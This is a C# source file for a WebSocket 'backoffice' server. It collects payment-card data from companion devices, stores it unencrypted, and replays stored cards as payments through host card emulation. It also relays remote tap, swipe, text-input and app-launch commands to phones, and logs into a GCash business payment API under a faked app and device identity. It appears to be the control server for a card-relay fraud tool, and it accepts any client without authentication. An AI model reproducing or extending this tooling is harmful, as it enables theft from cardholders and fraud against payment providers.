using System.Collections.Concurrent;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;

var Port = args.Length > 0 && int.TryParse(args[0], out var P) ? P : 8769;
var Cert = GenerateSelfSignedCert();
var Clients = new ConcurrentDictionary<string, (WebSocket Socket, string ClientType)>();
var Cts = new CancellationTokenSource();
var AuthBaseUrl = "https://pulsar.psr-it.com";
var AuthClient = new HttpClient();
AuthClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
var JwtToken = string.Empty;
var CardsFile = Path.Combine(AppContext.BaseDirectory, "stored-cards.json");
var StoredCards = new List<Dictionary<string, object?>>();
if (File.Exists(CardsFile)) { try { StoredCards = JsonSerializer.Deserialize<List<Dictionary<string, object?>>>(File.ReadAllText(CardsFile)) ?? new(); } catch { } }

void SaveCards() => File.WriteAllText(CardsFile, JsonSerializer.Serialize(StoredCards, new JsonSerializerOptions { WriteIndented = true }));

Console.CancelKeyPress += (_, E) => { E.Cancel = true; Cts.Cancel(); };

var ListenerTask = Task.Run(() => RunAcceptLoop(Cts.Token));
var BroadcastTask = Task.Run(() => RunUdpBroadcast(Cts.Token));

Console.WriteLine($"Backoffice WSS listening on wss://0.0.0.0:{Port}");
Console.WriteLine("UDP broadcast on port 8770");

try { await Task.WhenAll(ListenerTask, BroadcastTask); }
catch (OperationCanceledException) { }
Console.WriteLine("Backoffice stopped");

void RunAcceptLoop(CancellationToken Ct)
{
    var Listener = new TcpListener(IPAddress.Any, Port);
    Listener.Start();
    Ct.Register(Listener.Stop);

    while (!Ct.IsCancellationRequested)
    {
        try
        {
            var TcpClient = Listener.AcceptTcpClient();
            var ClientId = Guid.NewGuid().ToString("N")[..8];
            _ = Task.Run(() => HandleClient(TcpClient, ClientId, Ct));
        }
        catch (SocketException) when (Ct.IsCancellationRequested)
        {
            break;
        }
        catch (ObjectDisposedException)
        {
            break;
        }
        catch (Exception Ex)
        {
            Console.WriteLine($"Accept error: {Ex.Message}");
        }
    }
}

async Task HandleClient(TcpClient TcpClient, string ClientId, CancellationToken Ct)
{
    WebSocket? Ws = null;
    try
    {
        var NetworkStream = TcpClient.GetStream();
        var SslStream = new SslStream(NetworkStream, false);
        await SslStream.AuthenticateAsServerAsync(Cert, false, SslProtocols.None, false);

        var HttpRequest = await ReadHttpUpgradeRequest(SslStream, Ct);
        if (HttpRequest == null)
        {
            SslStream.Close();
            TcpClient.Close();
            return;
        }

        var WebSocketKey = ExtractWebSocketKey(HttpRequest);
        if (WebSocketKey == null)
        {
            SslStream.Close();
            TcpClient.Close();
            return;
        }

        SendWebSocketUpgradeResponse(SslStream, WebSocketKey);
        Ws = WebSocket.CreateFromStream(SslStream, new WebSocketCreationOptions { IsServer = true });

        Clients[ClientId] = (Ws, "Unknown");
        Console.WriteLine($"Client connected: {ClientId}");

        var Buffer = new byte[8192];
        while (Ws.State == WebSocketState.Open && !Ct.IsCancellationRequested)
        {
            var Result = await Ws.ReceiveAsync(Buffer, Ct);
            if (Result.MessageType == WebSocketMessageType.Close)
            {
                break;
            }
            if (Result.MessageType != WebSocketMessageType.Text)
            {
                continue;
            }

            var Json = Encoding.UTF8.GetString(Buffer, 0, Result.Count);
            await HandleMessage(ClientId, Json, Ct);
        }
    }
    catch (WebSocketException) { /* Expected during disconnect */ }
    catch (OperationCanceledException) { /* Expected during shutdown */ }
    catch (Exception Ex) { Console.WriteLine($"Client {ClientId} error: {Ex.Message}"); }
    finally
    {
        Clients.TryRemove(ClientId, out _);
        try { Ws?.Dispose(); } catch { /* Best-effort cleanup */ }
        try { TcpClient.Close(); } catch { /* Best-effort cleanup */ }
        Console.WriteLine($"Client disconnected: {ClientId}");
    }
}

async Task HandleMessage(string ClientId, string Json, CancellationToken Ct)
{
    try
    {
        using var Doc = JsonDocument.Parse(Json);
        var Root = Doc.RootElement;

        if (Root.TryGetProperty("ClientType", out var CtEl))
        {
            var Type = CtEl.GetString() ?? "Unknown";
            if (Clients.TryGetValue(ClientId, out var Existing))
            {
                Clients[ClientId] = (Existing.Socket, Type);
            }

            Console.WriteLine($"Client {ClientId} registered as {Type}");
            await SendToClient(ClientId, new { Type = "Registered", ClientType = Type }, Ct);
            return;
        }

        var Method = Root.TryGetProperty("Method", out var MEl) ? MEl.GetString() ?? string.Empty : string.Empty;
        var Id = Root.TryGetProperty("Id", out var IdEl) ? IdEl.GetString() ?? string.Empty : string.Empty;

        switch (Method)
        {
            case "Login":
                await HandleLogin(ClientId, Root, Id, Ct);
                break;
            case "ReadCard":
                await RelayToCompanions(Json, Ct);
                await SendToClient(ClientId, new { Type = "Response", Id, Method, Data = new { Status = "ReadCardSent" } }, Ct);
                break;
            case "CardData":
                if (Root.TryGetProperty("Payload", out var CardPayload) && CardPayload.ValueKind == JsonValueKind.Object)
                {
                    var CardDict = JsonSerializer.Deserialize<Dictionary<string, object?>>(CardPayload.GetRawText()) ?? new();
                    CardDict["StoredAt"] = DateTimeOffset.UtcNow.ToString("o");
                    CardDict["Id"] = Guid.NewGuid().ToString()[..8];
                    StoredCards.Add(CardDict);
                    SaveCards();
                    Console.WriteLine($"[CARD] Stored card #{StoredCards.Count}: {CardPayload.GetProperty("MaskedPan").GetString()}");
                }
                await RelayToBrowsers(Json, Ct);
                await RelayToBrowsers(JsonSerializer.Serialize(new { Method = "StoredCards", Cards = StoredCards }), Ct);
                break;
            case "GetCards":
                await SendToClient(ClientId, new { Method = "StoredCards", Cards = StoredCards }, Ct);
                break;
            case "UpdateCard":
                if (Root.TryGetProperty("Payload", out var UpdPayload))
                {
                    var UpdId = UpdPayload.TryGetProperty("Id", out var UidEl) ? UidEl.GetString() : null;
                    var Idx = StoredCards.FindIndex(C => C.TryGetValue("Id", out var V) && V?.ToString() == UpdId);
                    if (Idx >= 0)
                    {
                        StoredCards[Idx] = JsonSerializer.Deserialize<Dictionary<string, object?>>(UpdPayload.GetRawText()) ?? StoredCards[Idx];
                        SaveCards();
                        Console.WriteLine($"[CARD] Updated card {UpdId}");
                    }
                }
                await RelayToBrowsers(JsonSerializer.Serialize(new { Method = "StoredCards", Cards = StoredCards }), Ct);
                break;
            case "DeleteCard":
                var DelId = Root.TryGetProperty("CardId", out var DidEl) ? DidEl.GetString() : null;
                StoredCards.RemoveAll(C => C.TryGetValue("Id", out var V) && V?.ToString() == DelId);
                SaveCards();
                Console.WriteLine($"[CARD] Deleted card {DelId}");
                await RelayToBrowsers(JsonSerializer.Serialize(new { Method = "StoredCards", Cards = StoredCards }), Ct);
                break;
            case "PayWithCard":
                var PayId = Root.TryGetProperty("CardId", out var PidEl) ? PidEl.GetString() : null;
                var PayAmount = Root.TryGetProperty("Amount", out var PamtEl) ? PamtEl.GetInt64() : 100L;
                var PayCard = StoredCards.FirstOrDefault(C => C.TryGetValue("Id", out var V) && V?.ToString() == PayId);
                if (PayCard != null)
                {
                    Console.WriteLine($"[PAYMENT] Paying with stored card {PayId} amount={PayAmount}");
                    var PayJson = JsonSerializer.Serialize(new { Method = "SubmitPayment", Amount = PayAmount, Payload = PayCard });
                    await RelayToCompanions(PayJson, Ct);
                }
                else
                {
                    await SendToClient(ClientId, new { Method = "PaymentResult", Success = false, Error = "Card not found" }, Ct);
                }
                break;
            case "CreateReceipt":
                await HandleCreateReceipt(ClientId, Root, Id, Ct);
                break;
            case "SubmitPayment":
                await RelayToCompanions(Json, Ct);
                break;
            case "ConfirmOtp":
                await RelayToCompanions(Json, Ct);
                break;
            case "ActivationOtpRequired":
                await RelayToBrowsers(Json, Ct);
                Console.WriteLine("[ACTIVATION] OTP required — waiting for user input");
                break;
            case "PaymentResult":
                await RelayToBrowsers(Json, Ct);
                Console.WriteLine($"[PAYMENT] Result relayed to browsers");
                break;
            case "DeviceInfo":
                await RelayToBrowsers(Json, Ct);
                break;
            case "Screenshot":
            case "Tap":
            case "Swipe":
            case "InputText":
            case "LaunchApp":
            case "KeyEvent":
            case "LoadHce":
            case "AutoPay":
                await RelayToCompanions(Json, Ct);
                break;
            case "ScreenData":
                await RelayToBrowsers(Json, Ct);
                break;
            default:
                await SendToClient(ClientId, new { Type = "Error", Id, Error = $"Unknown method: {Method}" }, Ct);
                break;
        }
    }
    catch (Exception Ex)
    {
        Console.WriteLine($"HandleMessage error: {Ex.Message}");
    }
}

async Task HandleLogin(string ClientId, JsonElement Root, string Id, CancellationToken Ct)
{
    var Payload = Root.TryGetProperty("Payload", out var PayEl) ? PayEl : (JsonElement?)null;
    var Phone = Payload?.TryGetProperty("Phone", out var PhEl) == true ? PhEl.GetString() ?? string.Empty : string.Empty;
    var Password = Payload?.TryGetProperty("Password", out var PwEl) == true ? PwEl.GetString() ?? string.Empty : string.Empty;
    Console.WriteLine($"[AUTH] Login for {Phone}");

    var PasswordHash = Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes(Password)));
    var Body = new Dictionary<string, object>
    {
        ["device_model"] = "Browser",
        ["device_brand"] = "WASM",
        ["package_name"] = "com.gcash.business.pocketpay",
        ["time_zone_offset"] = 28800000,
        ["password"] = PasswordHash,
        ["app_version"] = "1.0.30",
        ["login"] = Phone,
        ["fcmtoken"] = "browser-wasm-token",
        ["android_id"] = "browser-wasm-id"
    };

    var Content = new StringContent(JsonSerializer.Serialize(Body), Encoding.UTF8, "application/json");
    var Response = await AuthClient.PostAsync($"{AuthBaseUrl}/api/v3/authorize", Content, Ct);
    var Token = await Response.Content.ReadAsStringAsync(Ct);

    if (!Response.IsSuccessStatusCode)
    {
        await SendToClient(ClientId, new { Type = "Response", Id, Method = "Login", Data = new { Success = false, Error = $"Login failed: {Response.StatusCode}" } }, Ct);
        return;
    }

    JwtToken = Token.Trim().Trim('"');
    AuthClient.DefaultRequestHeaders.Remove("Authorization");
    AuthClient.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", JwtToken.StartsWith("Bearer ", StringComparison.OrdinalIgnoreCase) ? JwtToken : "Bearer " + JwtToken);
    Console.WriteLine($"[AUTH] Login success, token length={JwtToken.Length}");
    await SendToClient(ClientId, new { Type = "Response", Id, Method = "Login", Data = new { Success = true, Token = JwtToken } }, Ct);
}

async Task HandleCreateReceipt(string ClientId, JsonElement Root, string Id, CancellationToken Ct)
{
    var Payload = Root.TryGetProperty("Payload", out var PayEl) ? PayEl : (JsonElement?)null;
    Console.WriteLine("[API] Create receipt");
    if (JwtToken.Length == 0)
    {
        await SendToClient(ClientId, new { Type = "Response", Id, Method = "CreateReceipt", Data = new { Success = false, Error = "Not authenticated" } }, Ct);
        return;
    }

    var BodyJson = Payload?.GetRawText() ?? "{}";
    var Content = new StringContent(BodyJson, Encoding.UTF8, "application/json");
    var Response = await AuthClient.PostAsync("https://api.psr-it.com/receipts", Content, Ct);
    var Json = await Response.Content.ReadAsStringAsync(Ct);
    Console.WriteLine($"[API] Receipt response: {Response.StatusCode} {Json}");
    await SendToClient(ClientId, new { Type = "Response", Id, Method = "CreateReceipt", Data = new { Success = Response.IsSuccessStatusCode, Raw = Json } }, Ct);
}

async Task RelayToCompanions(string Json, CancellationToken Ct)
{
    var Bytes = Encoding.UTF8.GetBytes(Json);
    foreach (var Kv in Clients)
    {
        if (Kv.Value.ClientType != "Companion") { continue; }
        try
        {
            if (Kv.Value.Socket.State == WebSocketState.Open)
            {
                await Kv.Value.Socket.SendAsync(Bytes, WebSocketMessageType.Text, true, Ct);
            }
        }
        catch (Exception) { Clients.TryRemove(Kv.Key, out _); }
    }
}

async Task RelayToBrowsers(string Json, CancellationToken Ct)
{
    var Bytes = Encoding.UTF8.GetBytes(Json);
    foreach (var Kv in Clients)
    {
        if (Kv.Value.ClientType != "Browser") { continue; }
        try
        {
            if (Kv.Value.Socket.State == WebSocketState.Open)
            {
                await Kv.Value.Socket.SendAsync(Bytes, WebSocketMessageType.Text, true, Ct);
            }
        }
        catch (Exception) { Clients.TryRemove(Kv.Key, out _); }
    }
}

async Task SendToClient(string ClientId, object Payload, CancellationToken Ct)
{
    if (!Clients.TryGetValue(ClientId, out var Entry))
    {
        return;
    }
    if (Entry.Socket.State != WebSocketState.Open)
    {
        return;
    }
    var Bytes = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(Payload));
    await Entry.Socket.SendAsync(Bytes, WebSocketMessageType.Text, true, Ct);
}

void RunUdpBroadcast(CancellationToken Ct)
{
    using var UdpClient = new UdpClient();
    UdpClient.EnableBroadcast = true;
    var Message = Encoding.UTF8.GetBytes($"{{\"Service\":\"TranspilerBackoffice\",\"WssPort\":{Port}}}");
    var Endpoint = new IPEndPoint(IPAddress.Broadcast, 8770);

    while (!Ct.IsCancellationRequested)
    {
        try
        {
            UdpClient.Send(Message, Message.Length, Endpoint);
            Thread.Sleep(5000);
        }
        catch (OperationCanceledException)
        {
            break;
        }
        catch (Exception Ex)
        {
            Console.WriteLine($"UDP broadcast error: {Ex.Message}");
            Thread.Sleep(10000);
        }
    }
}

static async Task<string?> ReadHttpUpgradeRequest(SslStream Stream, CancellationToken Ct)
{
    var Buffer = new byte[4096];
    var TotalRead = 0;
    while (TotalRead < Buffer.Length)
    {
        var BytesRead = await Stream.ReadAsync(Buffer.AsMemory(TotalRead, Buffer.Length - TotalRead), Ct);
        if (BytesRead == 0)
        {
            return null;
        }
        TotalRead += BytesRead;
        var Request = Encoding.UTF8.GetString(Buffer, 0, TotalRead);
        if (Request.Contains("\r\n\r\n", StringComparison.Ordinal))
        {
            return Request;
        }
    }
    return null;
}

static string? ExtractWebSocketKey(string HttpRequest)
{
    foreach (var Line in HttpRequest.Split("\r\n"))
    {
        if (Line.StartsWith("Sec-WebSocket-Key:", StringComparison.OrdinalIgnoreCase))
        {
            return Line[(Line.IndexOf(':') + 1)..].Trim();
        }
    }
    return null;
}

static void SendWebSocketUpgradeResponse(SslStream Stream, string WebSocketKey)
{
#pragma warning disable CA5350
    var AcceptKey = Convert.ToBase64String(
        System.Security.Cryptography.SHA1.HashData(Encoding.UTF8.GetBytes(WebSocketKey + "258EAFA5-E914-47DA-95CA-5AB5DC698230")));
#pragma warning restore CA5350
    var Response = new StringBuilder()
        .Append("HTTP/1.1 101 Switching Protocols\r\n")
        .Append("Upgrade: websocket\r\n")
        .Append("Connection: Upgrade\r\n")
        .Append("Sec-WebSocket-Accept: ").Append(AcceptKey).Append("\r\n")
        .Append("Access-Control-Allow-Origin: *\r\n")
        .Append("\r\n")
        .ToString();
    var ResponseBytes = Encoding.UTF8.GetBytes(Response);
    Stream.Write(ResponseBytes);
    Stream.Flush();
}

static X509Certificate2 GenerateSelfSignedCert()
{
    using var Rsa = RSA.Create(2048);
    var Request = new CertificateRequest("CN=TranspilerBackoffice", Rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
    var SanBuilder = new SubjectAlternativeNameBuilder();
    SanBuilder.AddDnsName("*");
    SanBuilder.AddIpAddress(IPAddress.Any);
    SanBuilder.AddIpAddress(IPAddress.Loopback);
    Request.CertificateExtensions.Add(SanBuilder.Build());
    Request.CertificateExtensions.Add(new X509BasicConstraintsExtension(false, false, 0, false));
    Request.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false));
    var Cert = Request.CreateSelfSigned(DateTimeOffset.UtcNow.AddMinutes(-5), DateTimeOffset.UtcNow.AddYears(10));
    return X509CertificateLoader.LoadPkcs12(Cert.Export(X509ContentType.Pfx), null, X509KeyStorageFlags.MachineKeySet);
}
